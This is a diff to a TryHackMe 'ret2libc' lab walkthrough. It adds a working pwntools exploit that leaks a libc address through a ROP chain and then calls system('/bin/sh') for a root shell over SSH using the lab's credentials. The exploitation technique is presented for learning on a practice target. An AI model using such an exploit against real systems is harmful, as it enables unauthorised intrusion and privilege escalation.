@@ -1,5 +1,5 @@
 <h1 align="center">ret2libc</h1>
-<p align="center">2026, January 9 &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>! Let´s learn together. Access this walkthrough room <a href="https://tryhackme.com/room/ret2libc">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/ca4bab91-1bc2-4c15-bd12-8d0bfb6215c6"></p>  
+<p align="center">2026, January 9 &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>! Let´s learn together. Access this walkthrough room <a href="https://tryhackme.com/room/ret2libc">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/72f9167c-0ee8-4350-9515-2a1b80ab3b1f"></p>  
 
 <br>
 <h2>Task 1 . Prerequisites</h2>
@@ -1258,7 +1258,81 @@ gef➤  find 0x00007f6beef7b000, 0x00007f6bef0f3000, (char)0x5f, (char)0xc3
 478 patterns found.
 ```
 
+<br>
+<br>
+<br>
+<p>Restarted the lab</p>
 
+
+```bash
+#!/usr/bin/env python3
+from pwn import *
+
+# 1. Setup Context
+# Load local binary and libc to gather gadgets and offsets
+context.binary = binary = ELF('./exploit_me')
+libc = ELF('./libc.so.6')
+rop = ROP(binary)
+
+# 2. Connection Details
+# ===> IMPORTANT: REPLACE THIS IP WITH THE TARGET MACHINE IP <===
+host = '10.10.XX.XX' 
+user = 'andy'
+password = 'ret2libc!'
+
+# Connect via SSH and spawn the process on the REMOTE machine
+s = ssh(user=user, host=host, password=password)
+p = s.process('/home/andy/exploit_me')
+
+# 3. Gadgets & Constants
+offset = 18
+padding = b'A' * offset
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadget = rop.find_gadget(['ret'])[0]  # Required for Stack Alignment
+
+# 4. Payload 1: Leak Libc Address
+log.info("Sending Payload 1 to leak 'gets' address...")
+payload1 = padding
+payload1 += p64(pop_rdi)
+payload1 += p64(binary.got['gets'])     # Argument: Address of 'gets' in GOT
+# payload1 += p64(binary.plt['puts'])     # Function: Call 'puts' to print it
+puts_plt = 0x4004a0                  # Manually set the address from your notes
+payload1 += p64(puts_plt)
+payload1 += p64(binary.symbols['main']) # Return to main to keep process alive
+
+p.recvuntil(b'Type your name:')
+p.clean()
+p.sendline(payload1)
+
+# 5. Calculate Libc Base
+p.recvline() # Skip "Your name is..." prompt
+# Receive leaked bytes, strip newline, pad to 8 bytes
+leaked_bytes = p.recvline().strip().ljust(8, b'\x00')
+leak_addr = u64(leaked_bytes)
+log.success(f"Leaked gets address: {hex(leak_addr)}")
+
+# Calculate Base Address
+libc.address = leak_addr - libc.symbols['gets']
+log.success(f"Libc base address: {hex(libc.address)}")
+
+# 6. Payload 2: Get Shell
+log.info("Sending Payload 2 for Root Shell...")
+bin_sh = next(libc.search(b'/bin/sh'))
+system_addr = libc.symbols['system']
+
+payload2 = padding
+payload2 += p64(pop_rdi)
+payload2 += p64(bin_sh)      # Arg: Pointer to "/bin/sh"
+payload2 += p64(ret_gadget)  # <--- ALIGNMENT FIX (required for Ubuntu x64)
+payload2 += p64(system_addr) # Function: system()
+
+p.sendline(payload2)
+p.interactive()
+```
+
+```bash
+python3 exploit.py
+```
 
 <img width="1147" height="740" alt="image" src="https://github.com/user-attachments/assets/32eee343-b1ab-405b-a90b-fbadb72c77e0" />
 
@@ -1294,4 +1368,11 @@ If you find any mistakes or just want to ask something, you can contact me on Tw
 <br>
 <br>
 <br>
+
+
+<img width="1891" height="895" alt="image" src="https://github.com/user-attachments/assets/4788b06f-749c-4d30-8dc9-0f662ac573bb" />
+
+<img width="1912" height="878" alt="image" src="https://github.com/user-attachments/assets/1d1ea7ee-51d1-4c3e-9a3e-0c3b105eabbf" />
+
+
 
